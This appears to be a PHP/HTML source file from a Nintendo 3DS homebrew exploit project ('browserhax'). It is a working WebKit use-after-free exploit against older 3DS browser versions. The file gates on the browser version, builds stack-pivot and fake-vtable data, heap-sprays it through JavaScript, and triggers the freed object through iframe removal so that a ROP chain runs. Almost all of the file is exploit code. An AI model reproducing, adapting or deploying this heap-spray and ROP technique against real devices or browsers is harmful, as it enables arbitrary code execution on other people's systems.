<?php

include_once("/home/yellows8/browserhax/browserhax_cfg.php");

include_once("3dsbrowserhax_common.php");

if(($browserver & 0x80) == 0)
{
	echo "This browser is not supported.\n";
	//error_log("3dswebkithax_removewinframe.php: BROWSER NOT SUPPORTED.");
	exit;
} else if($browserver >= 0x83)
{
	echo "This browser is not supported since the webkit vuln is fixed with this version.\n";
	//error_log("3dswebkithax_removewinframe.php: BROWSER NOT SUPPORTED(VULNFIXED).");
	exit;
}

$VTABLE_JUMPADR = $WEBKITCRO_MAPADR+0x3825;//The use-after-free object's "vtable" is set to an address nearby where the heap-spray data is located. This is the address which gets jumped to when the use-after-free vtable funcptr call is executed. r0 = <use-after-free object address>. This gadget does the following: 1) r0 = *r0 2) r0 = *(r0+8) 3) <return if r0==0> 4) r0 = *(r0+0x34) 5) r0 = *(r0+4) 6) calls vtable funcptr +16 from the object @ r0, with r1=1 and r2=<funcptr adr>.

$STACKPIVOTDATA_ADR = 0x08e20800;
$STACKPTR_ADR = 0x08f73014;

if($browserver == 0x80)
{
	//below addrs = newer_addrs - 0x9000
	$STACKPIVOTDATA_ADR = 0x08e17800;
	$STACKPTR_ADR = 0x08f6a014;
}

if($browserver == 0x82)
{
	$STACKPIVOTDATA_ADR = 0x08f3e014;
	$STACKPTR_ADR = 0x08f78014;
}

$ROPHEAP = $STACKPIVOTDATA_ADR;

$STACKPIVOTDATA = "\"";

for($i=0; $i<(0x7c>>2);)
{
	if($i < (0x34>>2))
	{
		if($i != (0x10>>2))
		{
			$STACKPIVOTDATA .= genu32_unicode($STACKPIVOTDATA_ADR);
		}
		else
		{
			$STACKPIVOTDATA .= genu32_unicode($STACKPIVOT_ADR);//This is the funcptr used by VTABLE_JUMPADR.
		}

		$i++;
	}
	else
	{
		$STACKPIVOTDATA .= genu32_unicode($STACKPTR_ADR);//stack ptr
		$STACKPIVOTDATA .= genu32_unicode($POPPC);//lr
		$STACKPIVOTDATA .= genu32_unicode($POPPC);//pc
		$i+=3;
	}
}
$STACKPIVOTDATA .= genu32_unicode($STACKPTR_ADR);//padding
$STACKPIVOTDATA .= "\"";

generate_ropchain();

$VTABLEDATA = "\"";
for($i=0; $i<((0x110-0x20)>>2); $i++)$VTABLEDATA .= genu32_unicode($STACKPIVOTDATA_ADR);
$tag = hash("sha256", $_SERVER['SCRIPT_NAME'], true);
for($hashi=0; $hashi<0x20; $hashi+=4)$VTABLEDATA .= genu32_unicode(ord($tag[$hashi]) | (ord($tag[$hashi+1])<<8) | (ord($tag[$hashi+2])<<16) | (ord($tag[$hashi+1])<<24));
$VTABLEDATA .= genu32_unicode($VTABLE_JUMPADR);
$VTABLEDATA .= "\"";
?>

<html>
	<head>
		<style>
			body {color:blue;background:black;} iframe {display:none;} h1 {text-align:center;}
		</style>

		<script>
			//This haxx is only for the new3ds browser atm, based on this: http://pastebin.com/ufBCQKda

			heapsetup();

			if(parent==window) {
				window.onload = function() {
				document.body.innerHTML += "<iframe src='#' />";
				};
			}
			else
			{
				var nb = 0;
				window.onload = function () {
				f = window.frameElement;
				p = f.parentNode;
				var o = document.createElement("object");
				o.addEventListener('beforeload', function () {
					if (++nb == 1) {
						p.addEventListener('DOMSubtreeModified', parent.afterfree_spray, false);
					} else if (nb == 2) {
						p.removeChild(f);
					}
					}, false);
					document.body.appendChild(o);
				};
			}

			function heapspray(mem, size, v) {
				var a = new Array(size - 20);
				for (var j = 0; j < a.length / (v.length / 4); j++) a[j] = v;
				var t = document.createTextNode(String.fromCharCode.apply(null, new Array(a)));

				mem.push(t);
			}

			function afterfree_spray(e)//This function(after the initial heapspray() code) was originally based on heap() from: http://www.exploit-db.com/exploits/16974/
			{
				var mem = [];
				for (var j = 20; j < 430; j++)
					heapspray(mem, j, unescape(<?= $VTABLEDATA ?>));
			}

			function heapsetup()
			{
				var stackpivot = unescape(<?= $STACKPIVOTDATA ?>);
				var ropchainstart = unescape(<?= $NOPSLEDROP ?>);//Start of ROP-chain, used as 'NOP'-sled.
				var ropchain = unescape(<?= $ROPCHAIN ?>);

				do
				{
					stackpivot += stackpivot;
				} while (stackpivot.length<0x4000);

				do
				{
					ropchainstart += ropchainstart;
				} while (ropchainstart.length<0x4000);

				ropchainstart += ropchain;

				target = new Array();
				for(i = 0; i < 10; i++)
				{
					if (i<5){ target[i] = stackpivot;}
					if (i>5){ target[i] = ropchainstart;}

					document.write(target[i]);
					document.write("<br />");
				}
			}
		</script>
	</head>
	<body>
	</body>
</html>
